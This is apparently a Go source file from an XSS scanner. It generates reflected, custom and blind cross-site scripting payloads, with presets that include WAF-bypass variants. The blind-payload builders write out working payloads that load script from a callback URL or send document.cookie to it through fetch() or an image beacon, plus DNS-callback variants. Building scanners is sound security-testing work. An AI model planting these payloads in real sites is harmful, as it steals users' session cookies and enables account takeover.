package payload

import (
	"fmt"
	"os"
	"strings"

	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// PayloadType categorizes how a payload is delivered.
type PayloadType string

const (
	PayloadTypeReflected PayloadType = "reflected"
	PayloadTypeBlind     PayloadType = "blind"
	PayloadTypeCustom    PayloadType = "custom"
	PayloadTypeDOM       PayloadType = "dom"
)

type Payload struct {
	Value    string              `json:"value"`
	Context  context.ContextType `json:"context"`
	Type     PayloadType         `json:"type"`
	Score    float64             `json:"score"`
	Desc     string              `json:"desc"`
	Severity model.Severity      `json:"severity"`
	isHTML   bool                // cached result of isHTMLPayload(value); not serialized
}

type Generator struct {
	callbackURL    string
	dnsDomain      string // DNS exfil domain (dnslog-style); blind payloads use <marker>.<domain>
	preset         PayloadPreset
	customPayloads []Payload // user-provided payloads from wordlist
	// blindPayloads/dnsPayloads are built once at construction (their inputs
	// are immutable), avoiding per-injection-point slice rebuilds in Generate.
	blindPayloads []Payload
	dnsPayloads   []Payload
}

// PayloadPreset controls payload volume vs speed tradeoff.
type PayloadPreset string

const (
	PresetMinimal  PayloadPreset = "minimal"  // Fast scan: 1-2 payloads per context
	PresetStandard PayloadPreset = "standard" // Balanced: all essential payloads
	PresetFull     PayloadPreset = "full"     // Thorough: all payloads including WAF bypass
)

func NewGenerator() *Generator {
	return &Generator{preset: PresetStandard}
}

func NewGeneratorWithCallback(callbackURL string) *Generator {
	return &Generator{
		callbackURL:   callbackURL,
		preset:        PresetStandard,
		blindPayloads: buildBlindPayloads(callbackURL),
	}
}

// NewGeneratorWithDNSCallback creates a generator whose blind payloads point
// at <marker>.<domain> subdomains (DNS exfil mode for dnslog-style platforms).
func NewGeneratorWithDNSCallback(domain string) *Generator {
	return &Generator{
		dnsDomain:   domain,
		preset:      PresetStandard,
		dnsPayloads: buildDNSBlindPayloads(domain),
	}
}

func (g *Generator) SetPreset(preset PayloadPreset) {
	g.preset = preset
}

// LoadWordlist reads custom payloads from a file (one per line).
// Empty lines and lines starting with # are skipped.
func (g *Generator) LoadWordlist(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Errorf("failed to read wordlist: %w", err)
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		g.customPayloads = append(g.customPayloads, Payload{
			Value:    line,
			Context:  context.ContextHTMLBody, // default; will be tested in all contexts
			Type:     PayloadTypeCustom,
			Score:    0.8,
			Desc:     fmt.Sprintf("Custom payload from %s", path),
			Severity: model.Medium,
			isHTML:   isHTMLPayload(line),
		})
	}
	return nil
}

// SetCustomPayloads directly sets custom payloads (for API/programmatic use).
func (g *Generator) SetCustomPayloads(payloads []Payload) {
	for i := range payloads {
		payloads[i].isHTML = isHTMLPayload(payloads[i].Value)
	}
	g.customPayloads = payloads
}

// QuoteCompatible reports whether a JS-string payload can break out of the
// detected string quote. quoteChar is the QuoteChar from context detection
// (' or ", empty when unknown). Only payloads starting with a quote
// character are gated — e.g. "-alert(1)-" is inert inside a single-quoted
// string and would produce a false-positive finding.
func QuoteCompatible(value string, ctxType context.ContextType, quoteChar string) bool {
	if ctxType != context.ContextJSString || quoteChar == "" || value == "" {
		return true
	}
	switch value[0] {
	case '\'':
		return quoteChar == "'"
	case '"':
		return quoteChar == `"`
	}
	return true
}

func (g *Generator) Generate(injection model.InjectionPoint) []Payload {
	var payloads []Payload

	for _, ctx := range injection.Contexts {
		// Inert contexts (raw-text elements, URL path/query positions —
		// ContextHTMLEntity with Escaped) can never pass the verifier's
		// context gate: generating their breakout payloads only wastes
		// requests.
		if !ctx.IsExploitable() {
			continue
		}
		templates := g.filterTemplates(GetTemplates(ctx.Type))
		for _, tmpl := range templates {
			if !QuoteCompatible(tmpl.Value, ctx.Type, ctx.QuoteChar) {
				continue
			}
			payloads = append(payloads, Payload{
				Value:    tmpl.Value,
				Context:  ctx.Type,
				Type:     PayloadTypeReflected,
				Score:    g.scorePayload(tmpl, ctx),
				Desc:     tmpl.Desc,
				Severity: tmpl.Severity,
			})
		}
	}

	if len(injection.Contexts) == 0 {
		templates := g.filterTemplates(GetTemplates(context.ContextHTMLBody))
		for _, tmpl := range templates {
			payloads = append(payloads, Payload{
				Value:    tmpl.Value,
				Context:  context.ContextHTMLBody,
				Type:     PayloadTypeReflected,
				Score:    0.5,
				Desc:     tmpl.Desc,
				Severity: tmpl.Severity,
			})
		}
	}

	if g.callbackURL != "" {
		payloads = append(payloads, g.blindPayloads...)
	}
	if g.dnsDomain != "" {
		payloads = append(payloads, g.dnsPayloads...)
	}

	// Append custom payloads from wordlist — tested only in contexts where
	// the payload structure could actually execute. This avoids wasting
	// requests on structurally impossible combinations (e.g., <script> in
	// a JS string context).
	if len(g.customPayloads) > 0 {
		for _, custom := range g.customPayloads {
			matched := false
			for _, ctx := range injection.Contexts {
				// Skip JS-only contexts for HTML-tag payloads
				if custom.isHTML && isJSOnlyContext(ctx.Type) {
					continue
				}
				// Quote-type gate applies to custom payloads too: a
				// double-quote breakout is inert in a single-quoted string.
				if !QuoteCompatible(custom.Value, ctx.Type, ctx.QuoteChar) {
					continue
				}
				ctxPayload := custom
				ctxPayload.Context = ctx.Type
				payloads = append(payloads, ctxPayload)
				matched = true
			}
			// If no specific context matched, fall back to HTMLBody
			if !matched || len(injection.Contexts) == 0 {
				payloads = append(payloads, custom)
			}
		}
	}

	return payloads
}

// filterTemplates returns a subset of templates based on the active preset.
func (g *Generator) filterTemplates(templates []PayloadTemplate) []PayloadTemplate {
	switch g.preset {
	case PresetMinimal:
		// Return only the first (highest-priority) template per context
		if len(templates) > 0 {
			return templates[:1]
		}
		return templates
	case PresetFull:
		// Return all templates including WAF bypass variants
		return templates
	default: // PresetStandard
		// Skip WAF-bypass-only variants
		var filtered []PayloadTemplate
		for _, tmpl := range templates {
			if !tmpl.WAFBypassOnly {
				filtered = append(filtered, tmpl)
			}
		}
		if len(filtered) == 0 {
			return templates // fallback if everything was filtered
		}
		return filtered
	}
}

// buildDNSBlindPayloads builds blind payloads for DNS exfil mode: each
// payload requests <xsscan-<rand>>.<domain>, so the dnslog-style platform
// records a DNS query proving execution. Works even when HTTP egress is
// blocked — only DNS resolution is needed.
// The caller (cmd) passes a run-unique subdomain prefix so each scan's
// DNS queries are attributable on dnslog-style platforms.
func buildDNSBlindPayloads(host string) []Payload {
	if host == "" {
		return nil
	}
	return []Payload{
		{
			Value:    fmt.Sprintf(`<img src="http://%s/x">`, host),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.7,
			Desc:     "DNS blind XSS via img src",
			Severity: model.High,
		},
		{
			Value:    fmt.Sprintf(`<script src="http://%s/x.js"></script>`, host),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.7,
			Desc:     "DNS blind XSS via script include",
			Severity: model.High,
		},
		{
			Value:    fmt.Sprintf(`<link rel="preload" href="http://%s/x.css">`, host),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.6,
			Desc:     "DNS blind XSS via link preload",
			Severity: model.Medium,
		},
	}
}

func buildBlindPayloads(callbackURL string) []Payload {
	if callbackURL == "" {
		return nil
	}
	return []Payload{
		{
			Value:    fmt.Sprintf(`<script src="%s"></script>`, callbackURL),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.8,
			Desc:     "Blind XSS via script include",
			Severity: model.High,
		},
		{
			Value:    fmt.Sprintf(`<img src=x onerror="fetch('%s?c='+document.cookie)">`, callbackURL),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.7,
			Desc:     "Blind XSS via img onerror + cookie exfil",
			Severity: model.High,
		},
		{
			Value:    fmt.Sprintf(`<script>new Image().src='%s?cookie='+encodeURIComponent(document.cookie)</script>`, callbackURL),
			Context:  context.ContextHTMLBody,
			Type:     PayloadTypeBlind,
			Score:    0.8,
			Desc:     "Blind XSS via Image beacon",
			Severity: model.High,
		},
	}
}

// isHTMLPayload reports whether a payload value contains HTML tags
// (e.g., <script>, <img>, <svg>). Such payloads can only execute in
// HTML contexts — not inside JavaScript strings or template literals.
func isHTMLPayload(value string) bool {
	lower := strings.ToLower(value)
	htmlIndicators := []string{
		"<script", "<img", "<svg", "<iframe", "<object", "<embed",
		"<math", "<details", "<video", "<audio", "<input", "<button",
		"onerror", "onload", "onclick", "onmouseover", "onfocus",
		"javascript:",
	}
	for _, ind := range htmlIndicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}
	return false
}

// isJSOnlyContext reports whether a context type is JavaScript-exclusive
// (inside a script block, JS string, or template literal). HTML payloads
// cannot execute in these contexts — they need an HTML breaker first.
func isJSOnlyContext(ct context.ContextType) bool {
	switch ct {
	case context.ContextJSString, context.ContextJSTemplateLiteral,
		context.ContextJSBlock, context.ContextJSComment:
		return true
	}
	return false
}

func (g *Generator) scorePayload(tmpl PayloadTemplate, ctx context.Context) float64 {
	baseScore := 0.5
	if ctx.IsExploitable() {
		baseScore += 0.2
	}
	switch tmpl.Severity {
	case model.Critical:
		baseScore += 0.2
	case model.High:
		baseScore += 0.15
	case model.Medium:
		baseScore += 0.1
	}
	if len(tmpl.Value) > 100 {
		baseScore -= 0.1
	}
	if baseScore > 1.0 {
		return 1.0
	}
	if baseScore < 0.0 {
		return 0.0
	}
	return baseScore
}
